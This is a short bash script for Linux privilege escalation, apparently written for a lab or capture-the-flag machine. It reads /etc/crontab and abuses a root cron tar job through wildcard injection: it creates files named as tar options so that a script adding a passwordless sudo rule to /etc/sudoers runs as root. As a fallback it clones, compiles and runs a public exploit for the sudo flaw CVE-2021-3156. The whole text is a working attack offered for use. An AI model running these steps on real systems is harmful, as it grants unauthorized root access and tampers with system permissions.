#!/bin/bash

# Check for cronjob
echo "[+] Checking for cronjob..."
cat /etc/crontab
echo "[+] Trying exploit via improper config in cronjob..."
cd /var/research
echo 'echo "resch ALL=(root) NOPASSWD:ALL" >> /etc/sudoers' > test.sh
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
sleep 1m
printf "\n\n\n" | sudo -S bash
echo

echo "[+] Trying exploit via software vulnerabilities in sudo..."
# Second PE exploit should top one fails
cd /home/resch/.scripts
git clone https://github.com/CptGibbon/CVE-2021-3156.git
cd CVE-2021-3156
make
# run
./exploit